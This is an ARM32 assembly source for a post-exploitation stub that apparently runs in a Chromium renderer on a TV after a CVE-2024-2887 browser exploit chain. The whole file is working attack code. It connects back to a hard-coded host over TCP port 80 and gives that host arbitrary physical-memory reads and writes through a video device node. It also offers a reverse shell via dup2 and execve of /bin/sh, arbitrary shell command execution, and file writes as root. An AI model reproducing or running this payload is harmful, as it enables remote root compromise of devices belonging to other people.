@ physrpc.S - position-independent ARM32 physmap RPC stub.
@ Runs inside the Chromium renderer after the CVE-2024-2887 chain
@ (backing+0x600, RWX).  Opens /dev/video30 and speaks a tiny binary
@ protocol over TCP/80 so the PC can read/write arbitrary physical pages.
@
@ NOTE: the shipped blob in server/payloads/browser_payload.js opens
@ /dev/video30; this source said video40 until 2026-10-24.  video30/40/60 are
@ the same driver family on this TV, but only video30 is the *proven* node, so
@ the source matches the blob (a rebuild + re-embed must not silently switch
@ nodes).  `python tools/build_physrpc.py --check-embedded` verifies the two
@ are identical; change both together.
@
@ Protocol (all u32 little-endian, 16-byte header: op, a, b, c)
@   op 0 READ     : a=phys page (4K aligned), b=offset, c=len (<=4096)
@                    -> c raw bytes
@   op 1 WRITE32  : a=phys page, b=offset, c=value -> 4-byte status
@   op 3 EXIT     : -> process exits
@   op 4 READMANY : a=first page, c=count -> per page: status(4B), then 4096B if status==0
@   op 5 EXEC     : dup2(sock) + execve("/bin/sh","-i")  (used after uid=0 patch)
@   other         : 4-byte status -22
@ Status values are 0 on success or a negative errno.
@
@ All data references are  base(r12) + 16-bit offset  because keystone's ARM
@ `adr` only encodes ARM-immediate distances; the builder fills the offsets.

    .syntax unified
    .arm

_start:
    mov     r12, pc
    sub     r12, r12, #8          @ r12 = runtime address of _start
    movw    r0, #OFF_stack_top
    add     sp, r12, r0           @ private stack inside the blob
    sub     sp, sp, #8

    @ prctl(PR_SET_NAME, "PHYSRPC1") so the task is findable in the task list
    mov     r0, #15
    movw    r1, #OFF_tag
    add     r1, r12, r1
    mov     r2, #0
    mov     r3, #0
    mov     r4, #0
    mov     r5, #0
    movw    r7, #172
    svc     #0
    mov     r5, r0                @ prctl result (reported in the hello)

    @ socket(AF_INET, SOCK_STREAM, 0)
    mov     r0, #2
    mov     r1, #1
    mov     r2, #0
    movw    r7, #281
    svc     #0
    mov     r6, r0
    cmp     r6, #0
    blt     fail

    @ connect(sock, &sa, 16)
    mov     r0, r6
    movw    r1, #OFF_sa
    add     r1, r12, r1
    mov     r2, #16
    movw    r7, #283
    svc     #0
    cmp     r0, #0
    blt     fail

    @ open("/dev/video40", O_RDWR); retry while another opener holds it
    mov     r9, #120          @ ~120 s of 1 s sleeps
open_retry:
    movw    r0, #OFF_path
    add     r0, r12, r0
    mov     r1, #2
    mov     r2, #0
    mov     r7, #5
    svc     #0
    mov     r8, r0
    cmp     r8, #0
    bge     open_ok
    movw    r0, #OFF_ts
    add     r0, r12, r0
    mov     r1, #0
    movw    r7, #162          @ nanosleep
    svc     #0
    subs    r9, r9, #1
    bne     open_retry
open_ok:

    @ send the routing magic first, then prctl_ret + open_ret (8 bytes)
    movw    r1, #OFF_hdr
    add     r1, r12, r1
    movw    r3, #0x4750
    movt    r3, #0x4244           @ 0x42444750 = "PGDB" little-endian
    str     r3, [r1]
    str     r5, [r1, #4]
    str     r8, [r1, #8]
    mov     r0, r6
    mov     r2, #4
    mov     r7, #4
    svc     #0
    mov     r0, r6
    add     r1, r1, #4
    mov     r2, #8
    mov     r7, #4
    svc     #0

    cmp     r8, #0
    blt     fail

loop:
    mov     r0, r6
    movw    r1, #OFF_hdr
    add     r1, r12, r1
    mov     r2, #16
    bl      recv_full
    cmp     r0, #0            @ recv_full: 0 = full 16 bytes, <0 = error/EOF
    bne     fail

    movw    r1, #OFF_hdr
    add     r1, r12, r1
    ldr     r0, [r1]          @ op
    ldr     r4, [r1, #4]      @ phys page
    ldr     r10, [r1, #8]     @ offset
    ldr     r11, [r1, #12]    @ len / value / count

    cmp     r0, #0
    beq     op_read
    cmp     r0, #1
    beq     op_write
    cmp     r0, #3
    beq     op_exit
    cmp     r0, #4
    beq     op_readmany
    cmp     r0, #5
    beq     op_exec
    cmp     r0, #6
    beq     op_fork
    cmp     r0, #7
    beq     op_run
    cmp     r0, #8
    beq     op_file
    mvn     r0, #21           @ -EINVAL (bitwise NOT 21 = -22)
    bl      send_status
    b       loop

op_read:
    @ The client controls offset/len; without this, send_full() would walk past
    @ the 4 KB mapping (a bad client, or a desynced stream, turns into a renderer
    @ SIGSEGV or a read of adjacent mappings).  No payload follows, so a reject
    @ can keep serving.
    movw    r2, #0x1000
    cmp     r10, r2
    bcs     op_bad
    sub     r2, r2, r10
    cmp     r11, r2
    bhi     op_bad
    mov     r0, r4
    bl      map_page
    cmn     r0, #4096
    bcs     op_err
    mov     r9, r0
    mov     r0, #0
    bl      send_status       @ status 0, then the data
    mov     r0, r6
    add     r1, r9, r10
    mov     r2, r11
    bl      send_full
    mov     r0, r9
    movw    r1, #0x1000
    mov     r7, #91           @ munmap
    svc     #0
    b       loop

op_write:
    @ offset+4 must stay inside the page (off <= 0xFFC).
    movw    r2, #0xffc
    cmp     r10, r2
    bhi     op_bad
    mov     r0, r4
    bl      map_page
    cmn     r0, #4096
    bcs     op_err
    mov     r9, r0
    add     r2, r9, r10
    str     r11, [r2]
    mov     r0, r9
    movw    r1, #0x1000
    mov     r7, #91
    svc     #0
    mov     r0, #0
    bl      send_status
    b       loop

op_readmany:
    @ Bound the batch: each page costs a 4 KB send, so a huge count is a
    @ self-inflicted stall (and the client can always ask again).
    movw    r2, #0x8000       @ at most 32768 pages (128 MB) per batch
    cmp     r11, r2
    bhi     op_bad
    mov     r10, r4           @ current page
rm_next:
    cmp     r11, #0
    beq     loop
    mov     r0, r10
    bl      map_page
    cmn     r0, #4096
    bcs     rm_err
    mov     r9, r0
    mov     r0, #0
    bl      send_status
    mov     r0, r6
    mov     r1, r9
    movw    r2, #0x1000
    bl      send_full
    mov     r0, r9
    movw    r1, #0x1000
    mov     r7, #91
    svc     #0
    add     r10, r10, #0x1000
    sub     r11, r11, #1
    b       rm_next
rm_err:
    bl      send_status
    b       loop

op_exec:
    mov     r0, r6
    mov     r1, #0
    mov     r7, #63           @ dup2
    svc     #0
    mov     r0, r6
    mov     r1, #1
    mov     r7, #63
    svc     #0
    mov     r0, r6
    mov     r1, #2
    mov     r7, #63
    svc     #0
    movw    r0, #OFF_shpath
    add     r0, r12, r0
    movw    r1, #OFF_argvbuf
    add     r1, r12, r1
    str     r0, [r1]
    movw    r3, #OFF_arg_i
    add     r3, r12, r3
    str     r3, [r1, #4]
    mov     r3, #0
    str     r3, [r1, #8]
    mov     r2, #0
    mov     r7, #11           @ execve
    svc     #0
    bl      send_status       @ only reached if execve failed
    b       loop

op_fork:
    mov     r7, #2            @ fork
    svc     #0
    cmp     r0, #0
    beq     fork_child
    bl      send_status       @ parent: r0 = child pid (or negative errno)
    b       loop

fork_child:
    @ the child is the newest task (tail of init_task.tasks); close the RPC
    @ socket and device fd so it cannot keep the connection alive, tag its
    @ comm, then sleep forever (its cred is shared with the parent).
    mov     r0, r6
    mov     r7, #6            @ close(sock)
    svc     #0
    mov     r0, r8
    mov     r7, #6            @ close(devfd)
    svc     #0
    mov     r0, #15           @ PR_SET_NAME
    movw    r1, #OFF_forktag
    add     r1, r12, r1
    mov     r2, #0
    mov     r3, #0
    mov     r4, #0
    mov     r5, #0
    movw    r7, #172
    svc     #0
fork_pause:
    mov     r7, #29           @ pause
    svc     #0
    b       fork_pause

@ op 7 RUN: c = length of "-c\0<command>"; fork, child dup2+execve
@ ("/bin/sh", ["/bin/sh","-c",cmd], NULL).  Parent keeps the socket alive
@ and returns the child pid.
op_run:
    movw    r2, #512          @ cmdbuf: "-c\0" + command, no more
    cmp     r11, r2
    bhi     op_bad_die        @ the payload follows; never overflow then parse it
    mov     r0, r6
    movw    r1, #OFF_cmdbuf
    add     r1, r12, r1
    mov     r2, r11
    bl      recv_full
    cmp     r0, #0
    bne     op_err
    mov     r7, #2            @ fork
    svc     #0
    cmp     r0, #0
    beq     run_child
    bl      send_status       @ parent: child pid (or -errno)
    b       loop
run_child:
    mov     r0, r6
    mov     r1, #0
    mov     r7, #63
    svc     #0
    mov     r0, r6
    mov     r1, #1
    mov     r7, #63
    svc     #0
    mov     r0, r6
    mov     r1, #2
    mov     r7, #63
    svc     #0
    movw    r0, #OFF_shpath
    add     r0, r12, r0
    movw    r1, #OFF_runargv
    add     r1, r12, r1
    str     r0, [r1]
    movw    r3, #OFF_cmdbuf
    add     r3, r12, r3
    str     r3, [r1, #4]      @ argv[1] = "-c"
    add     r3, r3, #3
    str     r3, [r1, #8]      @ argv[2] = command
    mov     r3, #0
    str     r3, [r1, #12]
    mov     r2, #0
    mov     r7, #11
    svc     #0
    mov     r0, #0
    movw    r7, #248
    svc     #0

@ op 8 FILE: a=flags (0 trunc, 1 append), b=pathlen, c=datalen.
@ Reads path then data from the socket and writes it as the (root) stub.
op_file:
    movw    r2, #256          @ pathbuf
    cmp     r10, r2
    bhi     op_bad_die
    movw    r2, #4096         @ databuf
    cmp     r11, r2
    bhi     op_bad_die
    mov     r0, r6
    movw    r1, #OFF_pathbuf
    add     r1, r12, r1
    mov     r2, r10
    bl      recv_full
    cmp     r0, #0
    bne     op_err
    mov     r0, r6
    movw    r1, #OFF_databuf
    add     r1, r12, r1
    mov     r2, r11
    bl      recv_full
    cmp     r0, #0
    bne     op_err
    movw    r0, #OFF_pathbuf
    add     r0, r12, r0
    mov     r1, #0x41         @ O_WRONLY|O_CREAT
    cmp     r4, #0
    beq     file_trunc
    orr     r1, r1, #0x400    @ O_APPEND
    b       file_open
file_trunc:
    orr     r1, r1, #0x200    @ O_TRUNC
file_open:
    mov     r2, #0x1a4        @ 0644
    mov     r7, #5
    svc     #0
    mov     r9, r0
    cmp     r9, #0
    blt     op_err
    mov     r0, r9
    movw    r1, #OFF_databuf
    add     r1, r12, r1
    mov     r2, r11
    mov     r7, #4
    svc     #0
    mov     r0, r9
    mov     r7, #6
    svc     #0
    mov     r0, #0
    bl      send_status
    b       loop

op_bad:
    mvn     r0, #21           @ -EINVAL, and no payload was sent: keep serving
    bl      send_status
    b       loop

op_bad_die:
    mvn     r0, #21           @ -EINVAL, but the op's payload is still in the
    bl      send_status       @ socket: parsing it as the next header is how a
    b       op_exit           @ bad client turns into a corrupt write, so die
                              @ cleanly and let the next page load give a stub

op_err:
    bl      send_status       @ r0 already holds negative errno
    b       loop

op_exit:
    mov     r0, #0
    movw    r7, #248          @ exit_group (whole renderer; closes the socket)
    svc     #0

fail:
    mov     r0, #0
    movw    r7, #248
    svc     #0

@ ---------------------------------------------------------------- helpers
@ map_page(r0=phys page) -> r0 = user va or negative errno
map_page:
    push    {r4, r5, lr}
    mov     r5, r0, lsr #12
    mov     r0, #0
    movw    r1, #0x1000
    mov     r2, #3            @ PROT_READ|PROT_WRITE
    mov     r3, #1            @ MAP_SHARED
    mov     r4, r8            @ dev fd
    movw    r7, #0xc0         @ mmap2
    svc     #0
    pop     {r4, r5, pc}

@ recv_full(r0=sock, r1=buf, r2=len) -> bytes read (==len) or negative
@ NOTE: r6 (socket fd) and r8 (device fd) are global state and must never be
@ clobbered by helpers.  r3 is safe across svc on ARM Linux.
recv_full:
    push    {r4, r5, lr}
    mov     r4, r0            @ sock
    mov     r5, r1            @ buf
    mov     r3, r2            @ remaining
rf_loop:
    cmp     r3, #0
    beq     rf_ok
    mov     r0, r4
    mov     r1, r5
    mov     r2, r3
    mov     r7, #3
    svc     #0
    cmp     r0, #0
    blt     rf_err
    beq     rf_eof
    add     r5, r5, r0
    sub     r3, r3, r0
    b       rf_loop
rf_err:
    cmn     r0, #4            @ -EINTR -> retry
    beq     rf_loop
    b       rf_done
rf_eof:
    mvn     r0, #4            @ -EIO: EOF mid-header
    b       rf_done
rf_ok:
    mov     r0, #0
rf_done:
    pop     {r4, r5, pc}

@ send_full(r0=sock, r1=buf, r2=len) -> 0 or negative
send_full:
    push    {r4, r5, lr}
    mov     r4, r0            @ sock
    mov     r5, r1            @ buf
    mov     r3, r2            @ remaining
sf_loop:
    cmp     r3, #0
    beq     sf_ok
    mov     r0, r4
    mov     r1, r5
    mov     r2, r3
    mov     r7, #4
    svc     #0
    cmp     r0, #0
    blt     sf_err
    beq     sf_ok
    add     r5, r5, r0
    sub     r3, r3, r0
    b       sf_loop
sf_err:
    cmn     r0, #4
    beq     sf_loop
    b       sf_done
sf_ok:
    mov     r0, #0
sf_done:
    pop     {r4, r5, pc}

@ send_status(r0=value) - clobbers r0-r3,r7 only
send_status:
    push    {r1, r2, r3, lr}
    mov     r3, r0
    movw    r1, #OFF_statusbuf
    add     r1, r12, r1
    str     r3, [r1]
    mov     r0, r6
    mov     r2, #4
    bl      send_full
    pop     {r1, r2, r3, pc}

@ ---------------------------------------------------------------- data
    .align 2
tag:        .ascii "PHYSRPC1\0"
forktag:    .ascii "PHYRFORK\0"
sa:         .word 0x50000002      @ AF_INET, port 80 (big endian)
            .word 0xd6b2a8c0      @ <pc-ip>
            .word 0
            .word 0
path:       .ascii "/dev/video30\0"
hello:      .ascii "PGDB"
shpath:     .ascii "/bin/sh\0"
arg_i:      .ascii "-i\0"
    .align 2
hdr:        .space 16
statusbuf:  .space 4
argvbuf:    .space 12
ts:         .word 1           @ tv_sec = 1  (nanosleep must actually wait)
            .word 0           @ tv_nsec = 0
pathbuf:    .space 256
databuf:    .space 4096
cmdbuf:     .space 512
runargv:    .space 16
    .align 3
stack:      .space 0x400
stack_top:
